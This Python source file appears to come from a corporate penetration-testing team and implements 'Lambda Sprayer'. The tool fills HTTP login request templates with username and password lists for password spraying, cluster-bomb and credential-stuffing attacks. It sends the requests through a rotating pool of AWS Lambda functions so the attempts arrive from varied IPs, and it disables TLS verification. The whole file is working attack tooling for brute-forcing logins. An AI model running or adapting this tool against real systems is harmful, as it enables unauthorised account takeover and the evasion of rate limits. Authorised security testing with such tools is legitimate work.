#/*
#* Copyright 2023 Workday, Inc.
#*
#* This software is available under the MIT license.
#* Please see the LICENSE.txt file in this project.
#*/


import datetime
import json
import logging
import os.path
import sys
import time
from argparse import ArgumentParser
from itertools import cycle
from urllib.parse import urlparse
from termcolor import colored

import ascii_magic
import boto3
import botocore.exceptions
import fontstyle
import pyfiglet
import requests
import urllib3
import re
import csv


# disables the TLS warning for no cert verification
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAME_DELIMITER = "USERNAME"
PASSWORD_DELIMITER = "PASSWORD"
USERNAME_PASS_DELIMITER = ":"
HEADER_DELIMITER = ":"
SPECIAL_TRACKER_DELIMITER = "***"  # some delimiter that does not appear in requests naturally
DEFAULT_SIMPLE_GET_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

HTTP_PREFIX = "http://"
HTTPS_PREFIX = "https://"
verbose = False

CONFIG_LAMBDA_NAME = "lambdafunction"
CONFIG_REGION = "region"
CONFIG_PROFILE = "profile"

# if config isn't present, we can write an empty config out
CONFIG_NAME = "config.json"
DEFAULT_CONFIG = '''{
    "lambdafunction":"Lambda_Spray_Function",
    "region":"us-west-2",
    "profile": ""
}\n'''


# TODO
# --- readme cleanup
# --- Do we want it to automatically switch to debug method (no lambda) if the proxy flag is present?
# --- added a timestamp, but we may want to move this to the lambda or it'll be when response received vs sent
# --- we may want to re-order functions for clarity (e.g. arg parsing near the top)
# --- regression testing (all parameters/args or modes)

def generate_ascii():
    art_file = ascii_magic.from_image_file(
        'ascii-4.png',
        width_ratio=2,
        height_ratio=10,
        columns=100)
    ascii_magic.to_terminal(art_file)
    lambda_text = pyfiglet.figlet_format("Lambda Sprayer", font="slant", width=100)
    print(lambda_text)
    author_label = "\n Author: Workday Inc. Pentest Team\n\n"
    font_style = fontstyle.apply(author_label, 'bold/Italic/Blue')
    print(font_style)


def color(status_code):
    if status_code in (200, 201, 204):
        status_code = colored(status_code, "green")
    elif status_code == 401:
        status_code = colored(status_code, "yellow")
    elif status_code == 403:
        status_code = colored(status_code, "blue")
    elif status_code in range(500, 600):
        status_code = colored(status_code, "red")
    elif status_code in range(300, 400):
        status_code = colored(status_code, "cyan")
    else:
        status_code = colored(status_code, "magenta")
    return status_code


def validate_config(config_to_validate):
    """
    Takes in a dictionary which has been parsed from a config file and ensures that required values are set.
    Intentionally multi-layered to hopefully give better errors
    """
    valid = True;
    missing_region = False
    missing_lambda_name = False

    if CONFIG_LAMBDA_NAME not in config_to_validate:
        print("[-] \"{CONFIG_LAMBDA_NAME}\" not found in the config file")
        missing_lambda_name = True
        valid = False

    if CONFIG_PROFILE not in config_to_validate:
        print(f"[-] \"{CONFIG_PROFILE}\" not found in the config file. Leave the value blank for default profile")
        valid = False

    if CONFIG_REGION not in config_to_validate:
        print(f"[-] \"{CONFIG_REGION}\" not found in the config file")
        missing_region = True
        valid = False

    if not missing_lambda_name:
        if not config_to_validate[CONFIG_LAMBDA_NAME]:
            print("[-] Config file is missing a lambda name value")
            valid = False
    if not missing_region:
        if not config_to_validate[CONFIG_REGION]:
            print("[-] Config file is missing a region value")
            valid = False

    return valid


def parse_username_file(username_file, list_to_populate):
    """
    Convenience method which takes in a file of usernames and parses it into a list for later use
    """

    logging.debug(f"Now opening username file: {username_file}")

    with open(username_file) as f:
        for line in f:
            list_to_populate.append(line.strip())


def parse_password_file(password_file, list_to_populate):
    """
    Convenience method which takes in a file of passwords and parses it into a list for later use
    """

    logging.debug(f"Now opening password file: {password_file}")

    with open(password_file) as f:
        for line in f:
            list_to_populate.append(line.strip())


def parse_username_pass_file(username_pass_file, user_list_to_populate, password_list_to_populate):
    """
    Convenience method which takes in a file of usernames and passwords, separated by a delimiter, and parses it into
    a list for later use
    """

    logging.debug(f"Now opening username/password file: {username_pass_file}")

    with open(username_pass_file) as f:
        for line in f:
            working_line = line.strip().split(USERNAME_PASS_DELIMITER)
            try:
                user_list_to_populate.append(working_line[0])
                password_list_to_populate.append(working_line[1])
            except IndexError:
                raise SystemExit(
                    f"[-] Username/Password list not formatted correctly. Should be User:Password per line")
            except Exception as otherException:
                raise SystemExit(f"[-] {otherException}")


# Handles basic argument parsing
def parse_arguments():
    """
    Handles argument parsing for the program. Any new arguments or updates to arguments should be defined in this
    function
    """

    parser = ArgumentParser()

    # Mutually exclusive commands
    target_selection = parser.add_mutually_exclusive_group(required=True)
    user_selection = parser.add_mutually_exclusive_group(required=True)

    # Target selection inputs
    target_selection.add_argument("-r", dest="request_file",
                                  help="Request file", metavar="FILE", required=False)
    target_selection.add_argument("--get", dest="simple_get_url", required=False,
                                  help="Simple GET request", metavar="URL")

    # User selection inputs
    user_selection.add_argument("--upl", dest="user_pass_list",
                                help="User password list", metavar="FILE")
    user_selection.add_argument("--ul", dest="user_list",
                                help="User list", metavar="FILE")
    user_selection.add_argument("-u", dest="user",
                                help="Target User", metavar="TARGET USER")

    # Password selection inputs
    parser.add_argument("--pl", dest="password_list",
                        help="User list", metavar="FILE")
    parser.add_argument("-p", dest="password",
                        help="Target Password", metavar="TARGET PASSWORD")

    # Debugging arguments
    parser.add_argument("-v", "--verbose",
                        action="count", dest="verbose", default=0,
                        help="Print detailed messages to stdout")
    parser.add_argument("--proxy", dest="proxy_address", help="Proxy address for testing. Disables Lambda",
                        metavar="IP:PORT")

    # Special arguments
    parser.add_argument("--insecure", dest="TLS", help="Disable TLS", action="store_false", default=True)
    parser.add_argument("-c", "--count", dest="count", help="Number of lambdas to use", required=False, default="1")
    parser.add_argument("--no-banner", dest="banner", help="Remove art from the output", required=False,
                        action="store_false", default=True)
    parser.add_argument("-t", dest="throttle", required=False, help="Add minimum delay between requests")
    parser.add_argument("-o", dest="toCSV", required=False, help="Save output to csv file", default=False,
                        action="store_true")

    return parser.parse_args()


def invoke_lambda(request_to_invoke, awsdata, function_name, toCSV, output_request_file):
    """
    This invokes a downstream lambda function with a request object that the lambda is expected to invoke
    """

    logging.debug(f"Processing request : \n{json.dumps(request_to_invoke)}")
    logging.debug(f"Invoking on lambda: \n{function_name}")
    out_csv_file = output_request_file + "-output.csv"

    # an empty profile is allowed
    if awsdata[CONFIG_PROFILE]:
        session = boto3.Session(profile_name=awsdata[CONFIG_PROFILE])
    else:
        session = boto3.Session()

    lambda_client = session.client('lambda', region_name=awsdata[CONFIG_REGION])

    try:
        current_host = request_to_invoke.get("headers").get("Host")
        response = lambda_client.invoke(FunctionName=function_name,
                                        InvocationType='RequestResponse',
                                        Payload=json.dumps(request_to_invoke))
    except botocore.exceptions.NoCredentialsError as boto_err:
        raise SystemExit(f"[-] Boto3 error. Ensure you've authed via aws cli and your config is "
                         f"correct. Error: {boto_err}")
    except Exception as lambda_err:
        raise SystemExit(f"[-] {lambda_err}")

    payload = json.loads(response['Payload'].read())

    try:
        if toCSV:
            writeRowValue = []
            if not os.path.isfile(out_csv_file):
                f = csv.writer(open(out_csv_file, "w"))
                f.writerow(payload)
            for key, value in payload.items():
                writeRowValue.append(str(value))
            f = csv.writer(open(out_csv_file, "a"))
            f.writerow(writeRowValue)

    except csv.Error as csvError:
        print("Error in writing data to excel", csvError)

    status = color(payload['STATUSCODE'])
    print(f"[+] {datetime.datetime.now()} STATUS: {status} | LENGTH: {payload['BODYLENGTH']} "
          f"| CREDENTIALS: {payload['CREDENTIALS']} | IP: {payload['IP']} | HOST: {current_host}")


def populate_templates(users_list, password_list, request_string, cluster_bomb_spray):
    """
    This takes in lists of target users and passwords and creates a request for each pairing. If cluster bomb mode is
    used, each username is paired with each password. Otherwise, each username gets only one password (such as with
    credential stuffing attacks).
    """

    completed_templates = []

    if cluster_bomb_spray:
        for user in users_list:
            for password in password_list:
                temp_string = request_string.replace(USERNAME_DELIMITER, user).replace(PASSWORD_DELIMITER, password)
                temp_string += SPECIAL_TRACKER_DELIMITER + user + SPECIAL_TRACKER_DELIMITER + password

                logging.debug(f"Created a request template: \n{temp_string}")
                completed_templates.append(temp_string)
    else:
        # set the iterations to whichever list we have
        if not users_list:
            iter_length = len(password_list)
        else:
            iter_length = len(users_list)

        for x in range(iter_length):
            if users_list:
                temp_string = request_string.replace(USERNAME_DELIMITER, users_list[x])
                temp_string += SPECIAL_TRACKER_DELIMITER + users_list[x] + SPECIAL_TRACKER_DELIMITER
            if password_list:
                temp_string = temp_string.replace(PASSWORD_DELIMITER, password_list[x])
                temp_string += password_list[x]

                # will this actually work?

            # temp_string += SPECIAL_TRACKER_DELIMITER + users_list[x] + SPECIAL_TRACKER_DELIMITER + password_list[x]

            logging.debug(f"Created a request template: \n{temp_string}")
            completed_templates.append(temp_string)

    return completed_templates


def requests_from_templates(list_of_templates, simple_get_mode_enabled, tls=True):
    """
    This returns the actual request object for use if given a 'template.' A template is just a string version of a
    request. The tls parameter is present to determine if the request should be made with or without HTTPS.
    """

    headers = {}
    prepared_requests = []
    parsed_template = {}

    for template in list_of_templates:
        username = template.split(SPECIAL_TRACKER_DELIMITER)[1]
        password = template.split(SPECIAL_TRACKER_DELIMITER)[2]

        # needs to be done after username/password extraction as it modifies
        template = template.split(SPECIAL_TRACKER_DELIMITER)[0]

        if not simple_get_mode_enabled:
            parsed_template = parse_request_template_to_dictionary(template)
        logging.debug(f"Parsed a template to a dictionary: \n{parsed_template}")

        if "body" in parsed_template:
            data = parsed_template['body']
        else:
            data = ""

        # extract all the required elements if it is a request file
        if not simple_get_mode_enabled:
            url = parsed_template['URL'].split(" ")[1]
            http_method = parsed_template['URL'].split(" ")[0]
            host = parsed_template['Host']

            for key, value in parsed_template.items():
                if key == 'body' or key == 'URL':
                    continue
                else:
                    headers[key] = value
        # manually populate the required elements if needed
        else:
            parsed_uri = urlparse(template)
            logging.debug(f"parsed a URI to: {parsed_uri}")
            host = parsed_uri.netloc
            http_method = "GET"
            url = parsed_uri.path
            if parsed_uri.query:
                url = url + "?" + parsed_uri.query
            headers["User-Agent"] = DEFAULT_SIMPLE_GET_UA

        if tls:
            url = HTTPS_PREFIX + host + url
        else:
            url = HTTP_PREFIX + host + url

        # opting for a dictionary to make transfer to lambda safer
        request_dict = {"http_method": http_method, "url": url, "data": data, "headers": headers, "username": username,
                        "password": password}

        # add the prepared request to a list for holding and passing to the lambda function
        prepared_requests.append(request_dict)

    return prepared_requests


def parse_request_template_to_dictionary(request_template):
    """
    Convenience method which takes in a request template (string version of a request), and converts it to a
    dictionary for processing
    """

    header_name = ""
    header_value = ""
    has_body = True

    # split it into headers/body portions, sometimes saving to file will replace the carriage return with newlines
    request_blocks = re.split("\n\n|\r\n\r\n", request_template,
                              maxsplit=1)  # double carriage return between headers/body

    if len(request_blocks) == 1:  # no body delimiter, probably doesn't have a body
        has_body = False

    request_header_block = request_blocks[0]

    if has_body:
        body_block = request_blocks[1]
    else:
        body_block = ""  # just set the body to empty string if it doesn't exist

    # should have everything by here
    header_line = request_header_block.splitlines()

    testDict = {
        "URL": header_line[0]
    }

    for x in range(1, len(header_line)):
        if len(header_line[x]) < 1:
            continue

        if HEADER_DELIMITER in header_line[x]:  # if it has a colon, don't need the body check anymore
            split_header = header_line[x].split(HEADER_DELIMITER)
            header_name = split_header[0]
            header_value = HEADER_DELIMITER.join(split_header[1:])
            header_value = header_value.strip()  # strip any additional whitespaces

        testDict[header_name] = header_value

    testDict["body"] = body_block

    return testDict


def parse_read_from_cloudwatch(placeholder):
    print(placeholder)


def set_targets(args_list, user_list, password_list):
    """
    This sets the targets (username/password lists) as appropriate, given the arguments passed in at runtime
    """
    cluster_bomb_mode_setting = True

    # handle user and password settings section
    if args.user_list:
        parse_username_file(args_list.user_list, user_list)
        cluster_bomb_mode_setting = False

    if args.password_list:
        parse_password_file(args_list.password_list, password_list)
        cluster_bomb_mode_setting = False

    # Username and password combinations to iterate through
    if (args.user_list and args.password_list):
        cluster_bomb_mode_setting = True

    if args.user_pass_list:
        parse_username_pass_file(args_list.user_pass_list, users, passwords)
        cluster_bomb_mode_setting = False  # each user should only get one password

    if args.user:
        users.append(args.user)

    return cluster_bomb_mode_setting


def fire_request(request_to_fire, proxies_to_use):
    """
    This is mostly for testing purposes and is used to directly fire off a request object, without the use of lambda
    """
    req = requests.Request(request_to_fire["http_method"], url=request_to_fire["url"], data=request_to_fire["data"],
                           headers=request_to_fire["headers"])
    r = req.prepare()
    session = requests.Session()

    response = session.send(r, verify=False, proxies=proxies_to_use, allow_redirects=False)
    logging.debug(f"response: {response}")


# parameter, set brute force mode, required parameters force
if __name__ == '__main__':
    users = []
    passwords = []
    templates = []
    simple_get_mode = False

    args = parse_arguments()

    # have to set logger before calling other methods to avoid strange formats
    if args.verbose == 1:
        logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.INFO)
        logging.info("Verbose mode enabled")
    elif args.verbose > 1:
        logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.DEBUG)
        logging.info("Verbose mode enabled")
    else:
        logging.basicConfig(format="%(levelname)s: %(message)s")
        logging.info("Verbose mode not enabled")

    if args.banner:
        generate_ascii()

    cluster_bomb_mode = set_targets(args, users, passwords)

    # this is primarily for testing, we may want to move to a hidden flag
    proxies = None
    if args.proxy_address:
        proxies = {
            'http': args.proxy_address,
            'https': args.proxy_address
        }
        print(f"[+] proxy flag detected, switching to debug mode. WARNING: WILL NOT USE LAMBDAS")

    # check the config file exists
    if not os.path.isfile(CONFIG_NAME):
        print("[-] No config file found. Generating an empty one. Adjust the values in it and rerun")
        with open(CONFIG_NAME, "w") as text_file:
            text_file.write(DEFAULT_CONFIG)
        sys.exit(0)

    # read in the config file
    with open(CONFIG_NAME) as config_file:
        try:
            aws_data = json.load(config_file)
            logging.info(f"Read configuration: \n {aws_data}")
        except json.decoder.JSONDecodeError as decode_err:
            raise SystemExit(f"[-] Config file not recognized as valid json: {decode_err}")
        except Exception as err:
            raise SystemExit(err)

    # validate the config file has required values
    if not validate_config(aws_data):
        raise SystemExit("[-] Invalid config found. Cannot run")

    # parse the requests file or get URL. This is a mandatory parameter, so one should always be present
    request_file_name = "csvFileOutput"
    if args.simple_get_url:
        request_text = str(args.simple_get_url)
        simple_get_mode = True
    else:
        request_file_name = args.request_file
        with open(args.request_file, 'rb') as file:  # read as binary to keep carriage returns
            request_text = str(file.read().decode('ascii'))
            logging.debug("Request as bytes: ")
            logging.debug(":".join("{:02x}".format(ord(c)) for c in request_text))

    # generate request templates for lambda calls
    print("[+] Generating requests. This may take a minute")
    request_templates = populate_templates(users, passwords, request_text, cluster_bomb_mode)
    logging.debug("finished populating the templates")
    lambda_requests = requests_from_templates(request_templates, simple_get_mode, args.TLS)

    print("[+] Preparing to send requests through lambda")
    # cycle through lambda pool
    lambdas = []
    for i in range(0, int(args.count)):
        function_name = aws_data[CONFIG_LAMBDA_NAME] + "-" + str(i + 1)
        lambdas.append(function_name)

    lambda_cycle = cycle(lambdas)


    def next_lambda():
        return next(lambda_cycle)


    for request in lambda_requests:
        try:
            if args.throttle:
                delay = int(args.throttle)
                time.sleep(delay)
            function_name = next_lambda()
            if not args.proxy_address:
                invoke_lambda(request, aws_data, function_name, args.toCSV, request_file_name)
            else:
                fire_request(request, proxies)

        except botocore.exceptions.ClientError as error:
            logging.exception(error)
